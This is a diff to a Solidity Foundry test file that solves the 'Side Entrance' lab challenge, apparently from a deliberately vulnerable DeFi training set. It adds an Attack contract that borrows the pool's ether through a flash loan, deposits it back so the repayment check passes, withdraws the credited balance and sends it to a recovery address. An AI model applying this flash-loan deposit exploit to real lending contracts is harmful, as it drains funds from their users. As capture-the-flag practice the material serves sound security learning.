@@ -4,6 +4,31 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
+contract Attack {
+    SideEntranceLenderPool pool;
+    address recovery;
+    uint256 ETHER_IN_POOL;
+
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+        ETHER_IN_POOL = 1000e18;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function attack() external {
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
+    }
+
+    receive() external payable {}
+}
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +70,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        Attack attackContract = new Attack(address(pool), recovery);
+        attackContract.attack();
     }
 
     /**
